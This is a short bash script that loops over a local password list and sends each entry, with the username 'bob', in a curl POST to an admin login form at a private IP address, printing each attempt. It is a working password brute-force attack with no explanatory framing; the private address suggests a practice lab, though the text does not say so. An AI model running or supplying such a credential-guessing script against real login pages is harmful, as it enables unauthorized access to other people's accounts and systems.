# !/bin/bash


for i in $(cat /Users/dwald/Downloads/password) ; do
	curl -d "username=bob&password=${i}&Login=Login#" http://10.11.200.225/admin/
	echo "*** tested for: ${i} ***"

done
